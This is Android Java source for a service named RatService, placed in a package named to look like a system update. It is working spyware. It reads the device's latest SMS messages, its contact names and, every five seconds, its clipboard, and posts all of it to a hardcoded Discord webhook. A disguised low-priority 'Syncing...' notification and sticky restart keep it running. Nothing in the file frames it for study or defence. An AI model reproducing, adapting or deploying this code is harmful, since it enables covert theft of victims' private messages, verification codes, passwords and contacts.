package com.system.update;

import android.app.*;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Build;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.net.Uri;
import org.json.JSONObject;
import java.io.IOException;
import okhttp3.*;

public class RatService extends Service {
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566505631010000936/p7JDjQyMloPFqCP50Bmc4D8Qjop8nVcWaGH9FYTzfEry_4U39rQWqjGEE4mpPokrbqVa";
    
    private boolean isRunning = true;
    private OkHttpClient client = new OkHttpClient();
    private String lastClipboard = "";

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundService();
        
        // نبضة البداية
        sendToDiscord("✅ **التطبيق اشتغل بنجاح!**\nجاري سحب البيانات...");

        // سحب البيانات فوراً
        new Thread(() -> {
            sendToDiscord("📱 **معلومات الجهاز:**\n" + Build.MANUFACTURER + " " + Build.MODEL + "\nAndroid: " + Build.VERSION.RELEASE);
            sendSms();
            sendContacts();
            startClipboardMonitor();
        }).start();
    }

    private void startForegroundService() {
        String channelId = "sys_chan";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
        Notification notification;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notification = new Notification.Builder(this, channelId).setContentTitle("Syncing...").setSmallIcon(android.R.drawable.ic_menu_manage).build();
        } else {
            notification = new Notification.Builder(this).setContentTitle("Syncing...").setSmallIcon(android.R.drawable.ic_menu_manage).build();
        }
        startForeground(1, notification);
    }

    private void startClipboardMonitor() {
        new Thread(() -> {
            while (isRunning) {
                try {
                    ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                    if (cm.hasPrimaryClip() && cm.getPrimaryClip() != null) {
                        ClipData.Item item = cm.getPrimaryClip().getItemAt(0);
                        String text = item.getText() != null ? item.getText().toString() : "";
                        if (!text.isEmpty() && !text.equals(lastClipboard)) {
                            lastClipboard = text;
                            sendToDiscord("📋 **Clipboard:**\n" + text);
                        }
                    }
                    Thread.sleep(5000);
                } catch (Exception ignored) {}
            }
        }).start();
    }

    private void sendSms() {
        StringBuilder sb = new StringBuilder("📩 **آخر 15 رسالة SMS:**\n");
        Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 15");
        if (c != null && c.moveToFirst()) { 
            do { 
                sb.append("**From:** ").append(c.getString(c.getColumnIndexOrThrow("address"))).append("\n");
                sb.append(c.getString(c.getColumnIndexOrThrow("body"))).append("\n---\n"); 
            } while (c.moveToNext()); 
            c.close(); 
        }
        sendToDiscord(sb.toString());
    }
    
    private void sendContacts() {
        StringBuilder sb = new StringBuilder("👥 **جهات الاتصال:**\n");
        Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        int count = 0;
        if (c != null && c.moveToFirst()) { 
            do { 
                sb.append("- ").append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append("\n"); 
                count++;
                if (count > 30) break;
            } while (c.moveToNext()); 
            c.close(); 
        }
        sendToDiscord(sb.toString());
    }

    private void sendToDiscord(String text) {
        try {
            JSONObject json = new JSONObject();
            json.put("content", text);
            
            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
            Request request = new Request.Builder().url(WEBHOOK_URL).post(body).build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) { }
                @Override public void onResponse(Call call, Response response) { }
            });
        } catch (Exception ignored) {}
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onDestroy() { isRunning = false; super.onDestroy(); }
}
